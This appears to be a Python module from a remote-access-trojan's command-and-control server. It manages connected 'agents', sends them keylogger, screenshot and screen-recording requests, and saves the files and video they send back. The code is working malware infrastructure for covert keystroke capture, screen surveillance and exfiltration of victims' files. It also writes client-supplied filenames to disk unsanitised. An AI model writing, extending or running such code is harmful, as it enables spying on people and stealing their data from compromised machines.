# Standard library imports
import base64
import msgpack
from datetime import datetime
from socket import socket
from typing import cast

# Third-party imports
from Crypto.Cipher import PKCS1_OAEP

# Local imports
from agent import Agent
from logger import get_logger
from globals import AGENTS_JSON, ENCODING, RECV_SIZE, TLS_ENABLED

logger = get_logger()


class AgentTool:
    """
    A class for agent utilities and management.
    
    This class handles all agent-related operations including:
    - Agent lifecycle management (add, remove, get)
    - Message sending and broadcasting
    - File transfer handling
    - Client connection management
    """

    def __init__(self, agents: list[Agent] = []) -> None:
        """Initialize AgentTool with optional list of agents."""
        self.agents = agents

    def add_agent(self, agent: Agent) -> None:
        """Add agent to agents list."""
        self.agents.append(agent)

    def del_agent(self, agent: Agent) -> None:
        """Remove agent from agents list."""
        self.agents.remove(agent)

    def get_agents(self) -> list[Agent]:
        """Return list of agent objects."""
        return self.agents

    def get_agent_by_rhost(self, rhost: str) -> Agent | None:
        """Get agent by remote address."""
        for agent in self.agents:
            if agent.addr == rhost:
                return agent
        return None

    def get_agent_by_index(self, index: int) -> Agent:
        """Return an agent with given index number."""
        return self.agents[index]

    def print_agents_table(self):
        """Print agents table with index and address."""
        for i, agent in enumerate(self.agents):
            print(f"{i} | {agent.addr}")

    def add_role_to_agent(self, role: str, agent: Agent) -> list[str]:
        """Add a role to an agent if not already present."""
        if role not in agent.roles:
            agent.roles.append(role)
        else:
            logger.info(f"{role} is already assigned to {agent.addr}")
        return agent.roles

    def broadcast_msg(self, data: bytes) -> None:
        """Send message to all agents."""
        for agent in self.agents:
            agent.socket.sendall(data)
            logger.debug(f"Broadcast message sent to {agent.addr}")

    def send_str(self, agent: Agent, msg: str) -> None:
        """Send string message to an agent."""
        socket = agent.socket
        socket.sendall(msg.encode())

    def send_str_by_rhost(self, rhost: str, msg: str) -> None:
        """Send string message to an agent by remote address."""
        agent = self.get_agent_by_rhost(rhost)
        if agent is None:
            logger.info(f"No agents found with remote address {rhost}")
            return
        else:
            self.send_str(agent, msg)

    def send_bytes(self, agent: Agent, data: bytes) -> None:
        """Send bytes to an agent."""
        socket = agent.socket
        socket.sendall(data)

    def generate_msgpack_from_dict(self, dictionary: dict) -> bytes:
        """Convert dictionary to msgpack bytes."""
        return cast(bytes, msgpack.dumps(dictionary))

    def request_screenshoot(self, agent: Agent) -> None:
        """Request screenshot from a client."""
        request = {"type": "screenshoot"}
        msg = self.generate_msgpack_from_dict(request)
        self.send_bytes(agent=agent, data=msg)

    def request_keystrokes(self, agent: Agent) -> None:
        """Request keystrokes from a client."""
        request = {"type": "keylogger"}
        msg = self.generate_msgpack_from_dict(request)
        self.send_bytes(agent, msg)

    def handle_screenshoot(self, data: bytes) -> str:
        """Save screenshot data to file and return filename."""
        filename = str(datetime.now().timestamp()) + ".jpg"
        with open(filename, "wb") as f:
            f.write(data)
        return filename

    def save_transferred_file(self, file_transfer_state: dict, addr: tuple) -> bool:
        """Reconstruct and save the transferred file from chunks."""
        try:
            filename = f"{addr[0]}_{file_transfer_state['filename']}"
            
            # Reconstruct file data from chunks
            full_data = bytearray()
            for i in range(file_transfer_state['total_chunks']):
                if i in file_transfer_state['chunks_data']:
                    chunk_base64 = file_transfer_state['chunks_data'][i]
                    chunk_bytes = base64.b64decode(chunk_base64)
                    full_data.extend(chunk_bytes)
                else:
                    logger.error(f"Missing chunk {i} for file {filename}")
                    return False
            
            # Save to file
            with open(filename, 'wb') as f:
                f.write(full_data)
            
            logger.info(f"File saved: {filename} ({len(full_data)} bytes)")
            return True
            
        except Exception as e:
            logger.error(f"Error saving file: {e}")
            return False

    def handle_client(
        self,
        client_socket: socket,
        addr: tuple,
        rsa_chipher: PKCS1_OAEP.PKCS1OAEP_Cipher | None,
        encoding: str = ENCODING,
        recv_size: int = RECV_SIZE,
        tls_enabled: bool | str = TLS_ENABLED,
        agents_json: str = AGENTS_JSON,
        logger=get_logger(),
    ) -> None:
        """
        Handle client connection and message processing.
        
        This method manages the entire lifecycle of a client connection including:
        - Agent registration
        - Message reception and parsing
        - File transfer handling
        - Connection cleanup
        """
        logger.info(f"\nConnection from {addr}")
        agent = Agent(str(addr), ["agent"], agents_json, socket=client_socket)

        # Add agent to the agents list
        self.add_agent(agent)

        # File transfer state tracking
        file_transfer_state = {
            'active': False,
            'filename': '',
            'total_size': 0,
            'total_chunks': 0,
            'received_chunks': 0,
            'chunks_data': {}
        }

        unpacker = msgpack.Unpacker(raw = False)

        try:
            while True:
                ###message: str = "None"
                data = client_socket.recv(recv_size)
                if not data:
                    break

                logger.debug(f"DATA SIZE = {len(data)}")
                
                try:
                    # Handle encrypted messages
                    if tls_enabled and tls_enabled != "False" and rsa_chipher is not None:
                        ###message = self._handle_encrypted_message(data, rsa_chipher)

                        # UNPACKER KULLANARAK TEKRAR YAZILDI USTTEKI KODLAR SILINEBILIR

                        decrypted_data = rsa_chipher.decrypt(base64.b64decode(data))
                        unpacker.feed(decrypted_data)
                    else:
                        # Handle unencrypted messages
                        ###message = self._handle_unencrypted_message(data)

                        # UNPACKER KULLANARAK TEKRAR YAZILDI USTTEKI KODLAR SILINEBILIR

                        unpacker.feed(data)

                    # UNPACKER ILE DUZENLENDI
                    for deserialized_data in unpacker:
                        message_dict = deserialized_data[0]
                        
                        if "type" in message_dict:
                            self._handle_structured_message(message_dict, addr)
                            continue
                        
                        # Handle legacy messages (old format)
                        message = message_dict.get("content", "")
                    
                        # Process file transfer messages
                        if self._is_file_transfer_message(message):
                            self._handle_file_transfer_message(message, file_transfer_state, addr)
                            continue
                    
                        logger.info(f"Received from {addr}: {message}\n")
                    
                except Exception as msgpack_error:
                    logger.error(f"Msgpack deserialization error: {msgpack_error}")
                    self._handle_raw_message(data, addr)
                        
        except Exception as e:
            logger.error(f"Error with client {addr}: {e}")
        finally:
            # Cleanup connection
            self._cleanup_connection(agent, client_socket, addr)

    def _handle_encrypted_message(self, data: bytes, rsa_chipher: PKCS1_OAEP.PKCS1OAEP_Cipher) -> str:
        """Handle encrypted message decryption and parsing."""
        try:
            ###decrypted = rsa_chipher.decrypt(base64.b64decode(data))
            ###logger.debug(f"decrypted={decrypted}")
            ###deserialized_data: list = cast(list, msgpack.loads(decrypted))
            ###logger.debug(f"deserialized_data={deserialized_data}")
            ###message_dict: dict = deserialized_data[0]
            ###return message_dict["content"]

            # UNPACKER KULLANARAK TEKRAR YAZILDI USTTEKI KODLAR SILINEBILIR
            decrypted_data = rsa_chipher.decrypt(base64.b64decode(data))
            return msgpack.loads(decrypted_data)
        except Exception as e:
            logger.error(f"RSA decrypt error: {e}")
            raise

    def _handle_unencrypted_message(self, data: bytes) -> str:
        """Handle unencrypted message parsing."""
        ###deserialized_data: list = cast(list, msgpack.loads(data))
        ###message_dict: dict = deserialized_data[0]
        ###return message_dict["content"]

        # UNPACKER KULLANARAK TEKRAR YAZILDI USTTEKI KODLAR SILINEBILIR
        return msgpack.loads(data)

    def _handle_structured_message(self, message_dict: dict, addr: tuple) -> None:
        """Handle structured messages with different types."""
        message_type = message_dict.get("type", "")
        
        if message_type == "screen_recording_start":
            self._handle_screen_recording_start(message_dict, addr)
        elif message_type == "screen_frame":
            self._handle_screen_frame(message_dict, addr)
        elif message_type == "screen_recording_end":
            self._handle_screen_recording_end(message_dict, addr)
        elif message_type == "file_transfer":
            self._handle_single_file_transfer(message_dict, addr)
        elif message_type == "file_chunk":
            self._handle_structured_file_chunk(message_dict, addr)
        else:
            logger.warning(f"Unknown structured message type: {message_type} from {addr}")

    def _handle_screen_recording_start(self, message_dict: dict, addr: tuple) -> None:
        """Handle screen recording start message."""
        duration = message_dict.get("duration", "unknown")
        fps = message_dict.get("fps", "unknown")
        width = message_dict.get("width", "unknown")
        height = message_dict.get("height", "unknown")
        
        logger.info(f"Screen recording started from {addr}: {width}x{height} at {fps}fps for {duration}s")
        
        # Initialize screen recording session
        if not hasattr(self, 'screen_recordings'):
            self.screen_recordings = {}
        
        session_id = f"{addr[0]}_{addr[1]}_{datetime.now().timestamp()}"
        self.screen_recordings[addr] = {
            'session_id': session_id,
            'duration': int(duration) if duration.isdigit() else 0,
            'fps': int(fps) if fps.isdigit() else 30,
            'width': int(width) if width.isdigit() else 0,
            'height': int(height) if height.isdigit() else 0,
            'frames': {},
            'total_frames': 0,
            'received_frames': 0
        }

    def _handle_screen_frame(self, message_dict: dict, addr: tuple) -> None:
        """Handle individual screen recording frame."""
        if not hasattr(self, 'screen_recordings') or addr not in self.screen_recordings:
            logger.warning(f"Received frame from {addr} but no active recording session")
            return
        
        frame_number = int(message_dict.get("frame_number", 0))
        total_frames = int(message_dict.get("total_frames", 0))
        frame_data = message_dict.get("frame_data", "")
        
        session = self.screen_recordings[addr]
        session['total_frames'] = total_frames
        session['frames'][frame_number] = frame_data
        session['received_frames'] += 1
        
        # Log progress every 30 frames (1 second at 30fps)
        if frame_number % 30 == 0:
            logger.info(f"Screen recording progress from {addr}: frame {frame_number}/{total_frames}")

    def _handle_screen_recording_end(self, message_dict: dict, addr: tuple) -> None:
        """Handle screen recording end and create MP4 video."""
        if not hasattr(self, 'screen_recordings') or addr not in self.screen_recordings:
            logger.warning(f"Received recording end from {addr} but no active session")
            return
        
        session = self.screen_recordings[addr]
        self._create_video_from_frames(session, addr)
        del self.screen_recordings[addr]

    def _create_video_from_frames(self, session: dict, addr: tuple) -> None:
        """Create MP4 video from collected frames."""
        import os
        import tempfile
        import shutil
        import ffmpeg
        
        session_id = session['session_id']
        fps = session['fps']
        frames = session['frames']
        
        logger.info(f"Creating video from {len(frames)} frames for session {session_id}")
        
        # Use system temporary directory with proper permissions
        temp_dir = None
        try:
            temp_dir = tempfile.mkdtemp(prefix=f"screen_recording_{session_id}_")
            logger.debug(f"Created temporary directory: {temp_dir}")
            
            # Save frames as PNG files
            for frame_num in sorted(frames.keys()):
                frame_data = frames[frame_num]
                frame_bytes = base64.b64decode(frame_data)
                frame_filename = os.path.join(temp_dir, f"frame{frame_num:04d}.png")
                
                with open(frame_filename, 'wb') as f:
                    f.write(frame_bytes)
            
            # Create MP4 using ffmpeg-python
            output_filename = f"screen_recording_{addr[0]}_{session_id}.mp4"
            input_pattern = os.path.join(temp_dir, "frame%04d.png")
            
            logger.debug(f"Creating video: {output_filename}")
            
            (
                ffmpeg
                .input(input_pattern, framerate=fps)
                .output(output_filename, vcodec='libx264', pix_fmt='yuv420p')
                .overwrite_output()
                .run(capture_stdout=True, capture_stderr=True)
            )
            
            logger.info(f"Video created successfully: {output_filename}")
                
        except ffmpeg.Error as e:
            logger.error(f"FFmpeg error: {e.stderr.decode() if e.stderr else 'Unknown ffmpeg error'}")
        except PermissionError as pe:
            logger.error(f"Permission error creating video: {pe}")
        except Exception as e:
            logger.error(f"Error creating video: {e}")
        finally:
            # Clean up temporary directory
            if temp_dir and os.path.exists(temp_dir):
                try:
                    shutil.rmtree(temp_dir)
                    logger.debug(f"Cleaned up temporary directory: {temp_dir}")
                except Exception as cleanup_error:
                    logger.warning(f"Failed to cleanup temporary directory {temp_dir}: {cleanup_error}")

    def _handle_single_file_transfer(self, message_dict: dict, addr: tuple) -> None:
        """Handle single file transfer message."""
        filename = message_dict.get("filename", "unknown_file")
        filedata = message_dict.get("filedata", "")
        
        try:
            file_bytes = base64.b64decode(filedata)
            output_filename = f"{addr[0]}_{filename}"
            
            with open(output_filename, 'wb') as f:
                f.write(file_bytes)
            
            logger.info(f"File received and saved: {output_filename} ({len(file_bytes)} bytes)")
            
        except Exception as e:
            logger.error(f"Error saving file: {e}")

    def _handle_structured_file_chunk(self, message_dict: dict, addr: tuple) -> None:
        """Handle structured file chunk messages."""
        chunk_type = message_dict.get("chunk_type", "")
        
        if chunk_type == "start":
            # Initialize file transfer state for this address
            if not hasattr(self, 'file_transfers'):
                self.file_transfers = {}
            
            filename = message_dict.get("filename", "")
            total_size = int(message_dict.get("total_size", 0))
            total_chunks = int(message_dict.get("total_chunks", 0))
            
            self.file_transfers[addr] = {
                'filename': filename,
                'total_size': total_size,
                'total_chunks': total_chunks,
                'chunks': {}
            }
            logger.info(f"File transfer started: {filename} ({total_size} bytes, {total_chunks} chunks)")
            
        elif chunk_type == "data":
            if hasattr(self, 'file_transfers') and addr in self.file_transfers:
                chunk_number = int(message_dict.get("chunk_number", 0))
                chunk_data = message_dict.get("chunk_data", "")
                
                self.file_transfers[addr]['chunks'][chunk_number] = chunk_data
                
                # Log progress
                received_chunks = len(self.file_transfers[addr]['chunks'])
                total_chunks = self.file_transfers[addr]['total_chunks']
                if received_chunks % 10 == 0:
                    logger.info(f"File transfer progress: {received_chunks}/{total_chunks} chunks")
            
        elif chunk_type == "end":
            if hasattr(self, 'file_transfers') and addr in self.file_transfers:
                self._reconstruct_chunked_file(addr)
                del self.file_transfers[addr]

    def _reconstruct_chunked_file(self, addr: tuple) -> None:
        """Reconstruct file from chunks."""
        transfer_info = self.file_transfers[addr]
        filename = transfer_info['filename']
        chunks = transfer_info['chunks']
        total_chunks = transfer_info['total_chunks']
        
        # Reconstruct file data
        full_data = bytearray()
        for i in range(total_chunks):
            if i in chunks:
                chunk_bytes = base64.b64decode(chunks[i])
                full_data.extend(chunk_bytes)
            else:
                logger.error(f"Missing chunk {i} for file {filename}")
                return
        
        # Save file
        output_filename = f"{addr[0]}_{filename}"
        with open(output_filename, 'wb') as f:
            f.write(full_data)
        
        logger.info(f"Chunked file reconstructed: {output_filename} ({len(full_data)} bytes)")

    def _is_file_transfer_message(self, message: str) -> bool:
        """Check if message is related to file transfer."""
        return message.startswith(("FILE_START:", "FILE_CHUNK:", "FILE_END:"))

    def _handle_file_transfer_message(self, message: str, file_transfer_state: dict, addr: tuple) -> None:
        """Handle different types of file transfer messages."""
        if message.startswith("FILE_START:"):
            self._handle_file_start(message, file_transfer_state)
        elif message.startswith("FILE_CHUNK:"):
            self._handle_file_chunk(message, file_transfer_state)
        elif message.startswith("FILE_END:"):
            self._handle_file_end(file_transfer_state, addr)

    def _handle_file_start(self, message: str, file_transfer_state: dict) -> None:
        """Handle file transfer start message."""
        parts = message.split(":", 3)
        if len(parts) == 4:
            filename = parts[1]
            total_size = int(parts[2])
            total_chunks = int(parts[3])
            file_transfer_state.update({
                'active': True,
                'filename': filename,
                'total_size': total_size,
                'total_chunks': total_chunks,
                'received_chunks': 0,
                'chunks_data': {}
            })
            logger.info(f"File transfer started: {filename} ({total_size} bytes, {total_chunks} chunks)")

    def _handle_file_chunk(self, message: str, file_transfer_state: dict) -> None:
        """Handle file chunk message."""
        if file_transfer_state['active']:
            parts = message.split(":", 2)
            if len(parts) == 3:
                chunk_num = int(parts[1])
                chunk_data = parts[2]
                file_transfer_state['chunks_data'][chunk_num] = chunk_data
                file_transfer_state['received_chunks'] += 1
                
                # Progress logging every 50 chunks
                if file_transfer_state['received_chunks'] % 50 == 0:
                    logger.info(f"Received chunk {file_transfer_state['received_chunks']}/{file_transfer_state['total_chunks']}")

    def _handle_file_end(self, file_transfer_state: dict, addr: tuple) -> None:
        """Handle file transfer end message."""
        if file_transfer_state['active']:
            self.save_transferred_file(file_transfer_state, addr)
            file_transfer_state['active'] = False

    def _handle_raw_message(self, data: bytes, addr: tuple) -> None:
        """Handle raw text message when msgpack parsing fails."""
        try:
            raw_message = data.decode(ENCODING)
            logger.info(f"Raw message from {addr}: {raw_message}")
        except:
            logger.error(f"Could not decode message from {addr}")

    def _cleanup_connection(self, agent: Agent, client_socket: socket, addr: tuple) -> None:
        """Clean up connection resources."""
        self.del_agent(agent)
        client_socket.close()
        logger.info(f"Connection with {addr} closed")
